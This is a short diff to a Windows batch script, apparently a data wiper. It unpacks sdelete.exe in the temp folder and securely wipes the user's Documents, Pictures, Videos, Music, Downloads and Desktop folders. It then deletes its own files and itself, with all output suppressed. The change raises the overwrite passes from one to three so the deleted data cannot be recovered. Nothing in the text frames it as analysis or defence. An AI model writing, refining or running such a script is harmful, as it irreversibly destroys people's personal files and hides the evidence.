@@ -4,6 +4,6 @@ cd %temp% >nul
 powershell -command "Expand-Archive .\a.zip -Force" >nul
 powershell -command "rm "a.zip" -Force" >nul
 a\sdelete.exe /accepteula -nobanner >nul
-a\sdelete.exe -r -s -f -nobanner -p 1 "%UserProfile%\Documents" "%UserProfile%\Pictures" "%UserProfile%\Videos" "%UserProfile%\Music" "%UserProfile%\Downloads" "%UserProfile%\Desktop" >nul
+a\sdelete.exe -r -s -f -nobanner -p 3 "%UserProfile%\Documents" "%UserProfile%\Pictures" "%UserProfile%\Videos" "%UserProfile%\Music" "%UserProfile%\Downloads" "%UserProfile%\Desktop" >nul
 rmdir /S /Q "a" >nul
 start /b "" cmd /c del "%~f0"&exit /bn >nul
